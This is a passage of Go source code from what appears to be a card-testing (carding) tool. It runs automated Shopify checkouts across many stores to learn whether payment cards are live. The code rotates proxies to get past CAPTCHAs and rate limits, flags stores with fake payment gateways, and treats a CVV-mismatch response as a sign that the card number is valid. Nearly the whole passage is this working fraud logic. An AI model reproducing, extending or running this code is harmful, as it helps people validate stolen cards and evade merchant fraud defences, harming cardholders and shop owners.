							deadMu.Unlock()
						}
						lastFailInfo = fmt.Sprintf("%s:Step2:%s", siteLabel, truncErr(errStr))
						break // other error or last attempt → next site
					}
					if checkoutCtx.Err() != nil {
						checkoutCh <- checkoutOutcome{failInfo: fmt.Sprintf("%s:cancelled", siteLabel)}
						return
					}

					// ── Step 3: Proposal ──
					if err := cs.Step3Proposal(); err != nil {
						errStr := err.Error()
						fmt.Fprintf(os.Stderr, "[P2] [%s] Step3 FAIL: %s\n", siteLabel, errStr)
						// "no shipping handle" = site doesn't ship to our address
						// neww.py does NOT permanently kill these — just skips to next site
						// But we DO report as temp_dead so Python cools it down and evicts from cache
						if strings.Contains(errStr, "no shipping handle") {
							if pa < maxPA-1 {
								fmt.Fprintf(os.Stderr, "[P2] [%s] No shipping → retry with different address (%d/%d)\n", siteLabel, pa+1, maxPA)
								continue
							}
							deadMu.Lock()
							allTempDeadSites = append(allTempDeadSites, shopURL)
							allSiteSkipReasons[shopURL] = "NO_SHIPPING"
							deadMu.Unlock()
							lastFailInfo = fmt.Sprintf("%s:Step3:%s", siteLabel, truncErr(errStr))
							break // skip site, but do NOT permanently remove
						}
						// Network/proxy errors → retry with different proxy
						isNetworkErr := strings.Contains(errStr, "dial") ||
							strings.Contains(errStr, "net/http") ||
							strings.Contains(errStr, "tls handshake") ||
							strings.Contains(errStr, "context deadline") ||
							strings.Contains(errStr, "connection refused") ||
							strings.Contains(errStr, "connection reset") ||
							strings.Contains(errStr, "i/o timeout") ||
							strings.Contains(errStr, "429")
						if isNetworkErr && pa < maxPA-1 {
							fmt.Fprintf(os.Stderr, "[P2] [%s] Step3 network error → retry with different proxy (%d/%d)\n", siteLabel, pa+1, maxPA)
							continue // proxy issue → retry
						}
						lastFailInfo = fmt.Sprintf("%s:Step3:%s", siteLabel, truncErr(errStr))
						break // other error or last attempt → next site
					}
					if checkoutCtx.Err() != nil {
						checkoutCh <- checkoutOutcome{failInfo: fmt.Sprintf("%s:cancelled", siteLabel)}
						return
					}

					if isBogusGatewayName(cs.PaymentGateway) {
						fmt.Fprintf(os.Stderr, "[P2] [%s] Bogus payment gateway: %s\n", siteLabel, cs.PaymentGateway)
						deadMu.Lock()
						allPermDeadSites = append(allPermDeadSites, shopURL)
						allTestSites = append(allTestSites, shopURL)
						deadMu.Unlock()
						lastFailInfo = fmt.Sprintf("%s:Step3:BOGUS_GATEWAY", siteLabel)
						if singleSiteCheckout {
							checkoutCh <- checkoutOutcome{
								resp:     makeResp("error", "FAKE_GATEWAY_DETECTED"),
								terminal: true,
								failInfo: lastFailInfo,
							}
							sentResult = true
							return
						}
						break
					}

					// ── Step 4: Submit ──
					submitResult := cs.Step4Submit()

					if submitResult.ReceiptID == "" {
						code := submitResult.Code
						if code == "" {
							code = "UNKNOWN"
						}
						status := classifySingleCode(code)
						fmt.Fprintf(os.Stderr, "[P2] [%s] Step4 no receipt: code=%s status=%s\n",
							siteLabel, code, status)

						if status == "captcha" {
							if pa < maxPA-1 {
								fmt.Fprintf(os.Stderr, "[P2] [%s] CAPTCHA → retry with different proxy\n", siteLabel)
								continue // retry with next proxy!
							}
							deadMu.Lock()
							allCaptchaSites = append(allCaptchaSites, shopURL)
							allTempDeadSites = append(allTempDeadSites, shopURL)
							deadMu.Unlock()
							checkoutCh <- checkoutOutcome{
								resp: makeResp("captcha", code), captcha: true,
								failInfo: fmt.Sprintf("%s:Step4:captcha(tried %d proxies)", siteLabel, pa+1),
							}
							sentResult = true
							break // exhausted proxies, next site
						}
						if status == "site_error" {
							fmt.Fprintf(os.Stderr, "[P2] [%s] site_error: %s → marking for PERMANENT removal\n", siteLabel, code)
							checkoutCh <- checkoutOutcome{resp: makeResp("site_error", code), siteError: true, failInfo: fmt.Sprintf("%s:Step4:%s", siteLabel, code)}
							sentResult = true
							deadMu.Lock()
							allPermDeadSites = append(allPermDeadSites, shopURL)
							deadMu.Unlock()
							break // site issue → next site
						}
						if status == "site_skip" {
							logCheckout(siteLabel, "Step4", "site_skip code=%s msg=%s → next site", code, submitResult.Message)
							deadMu.Lock()
							allTempDeadSites = append(allTempDeadSites, shopURL)
							allSiteSkipReasons[shopURL] = code
							deadMu.Unlock()
							lastFailInfo = fmt.Sprintf("%s:Step4:%s", siteLabel, code)
							if len(viable) == 1 {
								checkoutCh <- checkoutOutcome{
									resp: makeResp("error", code), terminal: true,
									failInfo: lastFailInfo,
								}
								sentResult = true
								return
							}
							break
						}
						// Card-level result → terminal
						if status == "charged" || status == "approved" {
							kind := "charge"
							if status == "approved" {
								kind = "approval"
							}
							action := evaluateGatewayVerification(
								handleGatewayVerification(shopURL, siteLabel, *product, currentProxy, addresses, status == "charged"),
								kind, shopURL, siteLabel, "Step4", singleSiteCheckout, makeResp,
								&deadMu, &allPermDeadSites, &allTestSites,
							)
							if action.terminal != nil {
								checkoutCh <- *action.terminal
								return
							}
							if !action.proceed {
								lastFailInfo = action.failInfo
								break
							}
						}
						checkoutCh <- checkoutOutcome{
							resp: makeResp(status, code), terminal: true,
						}
						return
					}

					// Non-standard receipt ID
					if !strings.HasPrefix(submitResult.ReceiptID, "gid://shopify/") {
						code := submitResult.Code
						if code == "" {
							code = "SUBMIT_ACCEPTED"
						}
						nrStatus := classifySingleCode(code)
						if nrStatus == "charged" || nrStatus == "approved" {
							kind := "charge"
							if nrStatus == "approved" {
								kind = "approval"
							}
							action := evaluateGatewayVerification(
								handleGatewayVerification(shopURL, siteLabel, *product, currentProxy, addresses, nrStatus == "charged"),
								kind, shopURL, siteLabel, "Step4", singleSiteCheckout, makeResp,
								&deadMu, &allPermDeadSites, &allTestSites,
							)
							if action.terminal != nil {
								checkoutCh <- *action.terminal
								return
							}
							if !action.proceed {
								lastFailInfo = action.failInfo
								break
							}
						}
						r := makeResp(nrStatus, code)
						r.ReceiptID = submitResult.ReceiptID
						checkoutCh <- checkoutOutcome{resp: r, terminal: true}
						return
					}

					// ── Step 5: Poll receipt ──
					success, pollCode, pollResponse := cs.Step5PollReceipt(submitResult.ReceiptID)
					code := pollCode
					if pollResponse != nil {
						code = extractReceiptCode(pollResponse)
					}
					status := classifySingleCode(code)
					if success {
						status = "charged"
					}

					if strings.Contains(strings.ToUpper(code), "CAPTCHA") {
						if pa < maxPA-1 {
							fmt.Fprintf(os.Stderr, "[P2] [%s] CAPTCHA at Step5 → retry with different proxy\n", siteLabel)
							continue // retry with next proxy!
						}
						deadMu.Lock()
						allCaptchaSites = append(allCaptchaSites, shopURL)
						allTempDeadSites = append(allTempDeadSites, shopURL)
						deadMu.Unlock()
						r := makeResp("captcha", code)
						r.ReceiptID = submitResult.ReceiptID
						checkoutCh <- checkoutOutcome{resp: r, captcha: true,
							failInfo: fmt.Sprintf("%s:Step5:captcha(tried %d proxies)", siteLabel, pa+1)}
						sentResult = true
						fmt.Fprintf(os.Stderr, "[P2] [%s] CAPTCHA (tried %d proxies)\n", siteLabel, pa+1)
						break // exhausted proxies, next site
					}

					r := makeResp(status, code)
					r.ReceiptID = submitResult.ReceiptID

					if status == "site_error" {
						fmt.Fprintf(os.Stderr, "[P2] [%s] site_error after receipt: %s → marking for PERMANENT removal\n", siteLabel, code)
						checkoutCh <- checkoutOutcome{resp: r, siteError: true, failInfo: fmt.Sprintf("%s:Step5:%s", siteLabel, code)}
						sentResult = true
						deadMu.Lock()
						allPermDeadSites = append(allPermDeadSites, shopURL)
						deadMu.Unlock()
						break // site issue → next site
					}
					if status == "site_skip" {
						fmt.Fprintf(os.Stderr, "[P2] [%s] site_skip after receipt: %s → skipping + temp_dead (no permanent removal)\n", siteLabel, code)
						deadMu.Lock()
						allTempDeadSites = append(allTempDeadSites, shopURL)
						allSiteSkipReasons[shopURL] = code
						deadMu.Unlock()
						lastFailInfo = fmt.Sprintf("%s:Step5:%s", siteLabel, code)
						break // skip to next site, but do NOT permanently kill
					}

					// Card-level result → stop
					if status == "charged" || status == "approved" {
						kind := "charge"
						if status == "approved" {
							kind = "approval"
						}
						action := evaluateGatewayVerification(
							handleGatewayVerification(shopURL, siteLabel, *product, currentProxy, addresses, status == "charged"),
							kind, shopURL, siteLabel, "Step5", singleSiteCheckout, makeResp,
							&deadMu, &allPermDeadSites, &allTestSites,
						)
						if action.terminal != nil {
							checkoutCh <- *action.terminal
							return
						}
						if !action.proceed {
							lastFailInfo = action.failInfo
							break
						}
					}
					fmt.Fprintf(os.Stderr, "[P2] [%s] Result: %s/%s\n",
						siteLabel, status, code)
					checkoutCh <- checkoutOutcome{resp: r, terminal: true}
					return
				} // end proxy retry loop (pa)
				if !sentResult && lastFailInfo != "" {
					checkoutCh <- checkoutOutcome{failInfo: lastFailInfo}
				}
			}
		}(w)
	}

	// Close results channel when all workers finish
	go func() {
		wg.Wait()
		close(checkoutCh)
	}()

	// ── Collect Phase 2 results ──
	var lastCaptcha *SingleResponse
	var lastSiteError *SingleResponse
	var siteErrorCount int
	var failDetails []string
	for o := range checkoutCh {
		if o.failInfo != "" {
			failDetails = append(failDetails, o.failInfo)
		}
		if o.terminal {
			checkoutCancel()
			o.resp.DeadSites = dedup(allPermDeadSites)
			o.resp.TestSites = dedup(allTestSites)
			o.resp.TempDeadSites = dedup(allTempDeadSites)
			o.resp.SiteSkipReasons = allSiteSkipReasons
			o.resp.CaptchaSites = dedup(allCaptchaSites)
			o.resp.DiscoveredProducts = allDiscovered
			o.resp.Elapsed = elapsed(start)
			fmt.Fprintf(os.Stderr, "[SINGLE] Card result: %s/%s in %.1fs (P1=%.1fs)\n",
				o.resp.Status, o.resp.Code, elapsed(start), phase1Time)
			return o.resp
		}
		if o.captcha && lastCaptcha == nil {
			resp := o.resp
			lastCaptcha = &resp
		}
		if o.siteError {
			siteErrorCount++
			resp := o.resp
			lastSiteError = &resp
		}
	}

	if lastCaptcha != nil {
		lastCaptcha.Elapsed = elapsed(start)
		lastCaptcha.DeadSites = dedup(allPermDeadSites)
		lastCaptcha.TestSites = dedup(allTestSites)
		lastCaptcha.TempDeadSites = dedup(allTempDeadSites)
		lastCaptcha.SiteSkipReasons = allSiteSkipReasons
		lastCaptcha.CaptchaSites = dedup(allCaptchaSites)
		lastCaptcha.DiscoveredProducts = allDiscovered
		return *lastCaptcha
	}

	// If all checkouts got site_error at Step 4 (PAYMENTS_METHOD etc),
	// return that instead of generic ALL_SITES_EXHAUSTED
	if lastSiteError != nil {
		origCode := lastSiteError.Code // preserve the actual site error code
		lastSiteError.Status = "error"
		lastSiteError.Code = "ALL_SITES_EXHAUSTED"
		lastSiteError.Error = fmt.Sprintf("found %d products, all %d checkouts returned site errors (%s) (%.1fs)",
			len(allDiscovered), siteErrorCount, origCode, elapsed(start))
		lastSiteError.ErrorType = "site_error"
		lastSiteError.FailureDetails = failDetails
		lastSiteError.Elapsed = elapsed(start)
		lastSiteError.DeadSites = dedup(allPermDeadSites)
		lastSiteError.TestSites = dedup(allTestSites)
		lastSiteError.TempDeadSites = dedup(allTempDeadSites)
		lastSiteError.SiteSkipReasons = allSiteSkipReasons
		lastSiteError.CaptchaSites = dedup(allCaptchaSites)
		lastSiteError.DiscoveredProducts = allDiscovered
		fmt.Fprintf(os.Stderr, "[SINGLE] All %d checkouts site_error in %.1fs (P1=%.1fs)\n",
			siteErrorCount, elapsed(start), phase1Time)
		return *lastSiteError
	}

	// Build summary of failure steps for quick diagnosis
	stepCounts := map[string]int{}
	for _, fd := range failDetails {
		parts := strings.SplitN(fd, ":", 3)
		if len(parts) >= 2 {
			stepCounts[parts[1]]++
		}
	}
	var stepSummary []string
	for step, cnt := range stepCounts {
		stepSummary = append(stepSummary, fmt.Sprintf("%s=%d", step, cnt))
	}
	summaryStr := strings.Join(stepSummary, ",")

	return SingleResponse{
		Status:             "error",
		Code:               lastCodeOr("ALL_SITES_EXHAUSTED", failDetails),
		Error:              fmt.Sprintf("found %d products, tried %d checkouts, all failed [%s] (%.1fs)", len(allDiscovered), len(viable), summaryStr, elapsed(start)),
		ErrorType:          "unknown",
		FailureDetails:     failDetails,
		Elapsed:            elapsed(start),
		DeadSites:          dedup(allPermDeadSites),
		TestSites:          dedup(allTestSites),
		TempDeadSites:      dedup(allTempDeadSites),
		SiteSkipReasons:    allSiteSkipReasons,
		CaptchaSites:       dedup(allCaptchaSites),
		DiscoveredProducts: allDiscovered,
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func elapsed(start time.Time) float64 {
	return time.Since(start).Seconds()
}

// dedup removes duplicate strings while preserving order
func dedup(ss []string) []string {
	seen := make(map[string]bool, len(ss))
	out := make([]string, 0, len(ss))
	for _, s := range ss {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

// truncErr truncates an error string to at most 80 chars for JSON output
func truncErr(s string) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > 80 {
		return s[:80]
	}
	return s
}

func classifySingleCode(code string) string {
	u := strings.ToUpper(code)

	if u == "SUCCESS" {
		return "charged"
	}

	// "FOR_CARD_TYPE" means the CVV *format* is wrong for the card brand
	// (e.g. 3-digit CVV sent for AMEX which requires 4). Not a real CVV
	// mismatch — tells us nothing about card validity → declined.
	if strings.Contains(u, "FOR_CARD_TYPE") {
		return "declined"
	}

	// CVV / CVC mismatch = card number is valid, CVV doesn't match
	cvvTokens := []string{"INCORRECT_CVC", "INVALID_CVC", "INVALID_CVV", "CVV", "CSC",
		"PAYMENTS_CREDIT_CARD_CVV_INVALID",
		"PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID",
		"PAYMENTS_CREDIT_CARD_CSC_INVALID",
		"PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID"}
	for _, tok := range cvvTokens {
		if strings.Contains(u, tok) {
			return "approved"
		}
	}

	if strings.Contains(u, "ACTION_REQUIRED") || strings.Contains(u, "3D") {
		return "approved"
	}

	if strings.Contains(u, "CAPTCHA_REQUIRED") {
		return "captcha"
	}

	// GENERIC_ERROR: neww.py treats as "worked=True" (card is done, move on)
	// Treat as declined in classification since it's a card-level terminal result
	if strings.Contains(u, "GENERIC_ERROR") {
		return "declined"
	}

	failTokens := []string{"CARD_DECLINED", "DECLINED", "RISKY",
		"INCORRECT_NUMBER", "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
		"FUNDING_ERROR", "PROCESSING_ERROR", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"}
	for _, tok := range failTokens {
		if strings.Contains(u, tok) {
			return "declined"
		}
	}

	// site_error: ONLY these 3 codes trigger permanent site removal
	// This matches neww.py line 4127 exactly:
	//   site_level_errors = {"MISSING_TOTAL", "CAPTCHA_METADATA_MISSING", "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP"}
	permSiteTokens := []string{"MISSING_TOTAL", "CAPTCHA_METADATA_MISSING",
		"BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP"}
	for _, tok := range permSiteTokens {
		if strings.Contains(u, tok) {
			return "site_error"
		}
	}

	// site_skip: site-level issues that should skip to next site but NOT permanently kill
	skipSiteTokens := []string{
		"MERCHANDISE_OUT_OF_STOCK", "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
		"PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "REQUIRED_ARTIFACTS_UNAVAILABLE",
		"HTTP_402", "HTTP_403", "HTTP_404", "HTTP_429", "THROTTLED", "HTTP_ERROR",
		"DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
		"VALIDATION_CUSTOM",
		"PAYMENTS_METHOD",
		"PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED",
		"PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
		"PAYMENTS_CREDIT_CARD_SESSION_ID",
		"NON_TEST_ORDER_LIMIT",
		"DELIVERY_COMPANY_REQUIRED",
		"DELIVERY_ADDRESS2_REQUIRED",
		"PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
		"INVALID_PAYMENT_METHOD",
		"PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
		"BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
		"PROCESSING_TIMEOUT",
		"POLL_GRAPHQL_ERROR",
		"TIMEOUT"}
	for _, tok := range skipSiteTokens {
		if strings.Contains(u, tok) {
			return "site_skip"
		}
	}

	return "unknown"
}
